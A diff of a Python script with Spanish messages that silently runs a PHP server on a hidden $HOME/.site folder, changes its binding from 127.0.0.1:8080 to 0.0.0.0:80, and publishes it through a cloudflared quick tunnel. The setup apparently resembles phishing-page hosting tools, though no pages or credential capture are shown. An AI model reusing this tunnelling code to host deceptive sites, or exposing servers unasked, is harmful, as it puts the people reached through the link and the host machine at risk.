@@ -673,10 +673,10 @@ def server():
         sleep(1)
     sprint("\n"+info2+"Iniciando el servidor PHP en localhost:8080....")
     internet()
-    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
+    system("cd $HOME/.site && php -S 0.0.0.0:80 > /dev/null 2>&1 &")
     sleep(2)
     while True:
-        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
+        if not system("curl --output /dev/null --silent --head --fail 0.0.0.0:80"):
             sprint("\n"+info+"El servidor PHP se inició correctamente :)")
             break
         else:
@@ -688,10 +688,10 @@ def server():
     system("rm -fr $HOME/.cffolder/log.txt")
     while True:
         if system("command -v termux-chroot > /dev/null 2>&1")==0:
-            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
+            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 0.0.0.0:80 --logfile log.txt > /dev/null 2>&1 &")
             break
         else:
-            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
+            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 0.0.0.0:80 --logfile log.txt > /dev/null 2>&1 &")
             break
     sleep(9)
     cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
